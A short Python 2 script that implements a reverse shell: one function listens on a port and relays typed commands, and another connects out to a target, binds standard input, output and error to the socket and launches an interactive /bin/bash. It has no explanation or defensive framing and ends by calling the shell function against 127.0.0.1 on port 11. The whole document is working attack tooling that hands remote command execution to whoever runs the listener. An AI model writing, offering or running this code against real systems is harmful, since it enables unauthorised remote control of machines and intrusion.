import socket
import os
import sys
import subprocess

def rsh(port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("",port))
    s.listen(5)
    client, addr = s.accept()
    while True:
        cmd = raw_input("")
        if cmd == 'quit' or cmd == 'exit':
            client.close()
            break
        else:
            client.sendall(cmd+'\n')
            sys.stdout.write(client.recv(204800))

def rs(target,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(['/bin/bash','-i'])

rs('127.0.0.1',11)
